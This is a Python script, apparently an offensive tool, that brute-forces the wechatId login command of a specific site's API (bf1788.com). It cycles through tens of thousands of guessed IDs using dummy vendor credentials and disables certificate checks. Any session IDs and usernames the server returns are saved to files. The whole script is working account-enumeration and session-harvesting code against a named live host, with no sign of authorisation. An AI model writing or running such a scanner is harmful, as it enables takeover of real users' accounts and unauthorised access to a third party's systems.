#!/usr/bin/env python3
"""
Dictionary-based wechatId scanner for bf1788.com
Uses common patterns and targeted formats
"""
import requests, urllib3, time, json, itertools, os
urllib3.disable_warnings()

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

def wechat_login(wechatId):
    params = {"cmd": "1000", "wechatId": wechatId, "sid": "", **BASE_PARAMS}
    try:
        resp = requests.post(TARGET, data=params, timeout=15, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            if isinstance(msg, dict) and msg.get("sid"):
                return msg.get("sid"), msg.get("username")
    except:
        pass
    return None, None

# D 模式列表
DICTIONARY_PATTERNS = [
    # 常見前綴 + 數字
    *[f"user{i}" for i in range(1, 10001)],
    *[f"test{i}" for i in range(1, 10001)],
    *[f"wechat{i}" for i in range(1, 10001)],
    *[f"admin{i}" for i in range(1, 10001)],
    *[f"t{i}" for i in range(1, 10001)],
    *[f"w{i:04d}" for i in range(1, 10001)],
    
    # 常見命名
    "testwechat001", "test", "demo", "guest", "admin", "root", "user",
    
    # 字母+數字組合
    *[f"{l1}{l2}{i:06d}" for l1, l2 in itertools.product('abc', 'abc') for i in range(1, 100)],
]

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--end", type=int, default=None)
    parser.add_argument("--delay", type=float, default=0.1)
    parser.add_argument("--save-dir", default=".")
    args = parser.parse_args()
    
    os.makedirs(args.save_dir, exist_ok=True)
    patterns = DICTIONARY_PATTERNS[args.start:args.end]
    
    print(f"[*] Scanning {len(patterns)} dictionary patterns...")
    
    found = []
    for i, wechatId in enumerate(patterns):
        sid, username = wechat_login(wechatId)
        
        if sid:
            result = {"wechatId": wechatId, "sid": sid, "username": username}
            found.append(result)
            print(f"[+] FOUND: wechatId={wechatId}, sid={sid}, username={username}")
            
            with open(f"{args.save_dir}/found_wechatids.txt", "a") as f:
                f.write(f"{wechatId}|{sid}|{username}\n")
        
        if (i + 1) % 1000 == 0:
            print(f"[*] Progress: {i+1}/{len(patterns)} (found: {len(found)})")
        
        time.sleep(args.delay)
    
    with open(f"{args.save_dir}/dictionary_enum_results.json", "w") as f:
        json.dump({"found": found, "total_scanned": len(patterns)}, f, indent=2)
    
    print(f"\n[*] Done! Found {len(found)} accounts")

if __name__ == "__main__":
    main()
